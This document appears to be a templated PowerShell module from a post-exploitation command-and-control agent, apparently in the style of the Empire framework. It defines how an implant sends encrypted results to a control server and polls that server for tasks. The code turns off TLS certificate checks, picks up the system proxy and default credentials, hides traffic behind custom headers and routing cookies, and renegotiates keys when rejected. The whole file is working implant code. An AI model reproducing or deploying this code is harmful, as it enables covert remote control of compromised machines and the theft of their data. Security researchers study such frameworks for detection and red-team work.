$Script:server = "{{ host }}";
$Script:ControlServers = @($Script:server);
$Script:ServerIndex = 0;
if($server.StartsWith('https')){
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
}

$Script:SendMessage = {
    param($Packets)

    if($Packets) {
        # build and encrypt the response packet
        $EncBytes = Encrypt-Bytes $Packets;

        # build the top level RC4 "routing packet"
        # meta 'RESULT_POST' : 5
        $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;

        if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
            # build the web request object
            $wc = New-Object System.Net.WebClient;
            # set the proxy settings for the WC to be the default system settings
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            if($Script:Proxy) {
                $wc.Proxy = $Script:Proxy;
            }

            $wc.Headers.Add('User-Agent', $Script:UserAgent);
            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};

            try {
                # get a random posting URI
                $taskURI = $Script:TaskURIs | Get-Random;
                $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
            }
            catch [System.Net.WebException]{
                # exception posting data...
                if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                    # restart key negotiation
                    Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
                    }
                }
            }
        }
    };

$Script:GetTask = {
    try {
        if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

            # meta 'TASKING_REQUEST' : 4
            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);

            # build the web request object
            $wc = New-Object System.Net.WebClient;

            # set the proxy settings for the WC to be the default system settings
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            if($Script:Proxy) {
                $wc.Proxy = $Script:Proxy;
            }

            $wc.Headers.Add("User-Agent",$script:UserAgent);
            $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)};
            $wc.Headers.Add("Cookie","{{ session_cookie }}session=$RoutingCookie");

            # choose a random valid URI for checkin
            $taskURI = $script:TaskURIs | Get-Random;
            $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);
            $result;
        }
    }
    catch [Net.WebException] {
        $script:MissedCheckins += 1;
        if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
            # restart key negotiation
            Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
        }
    }
};
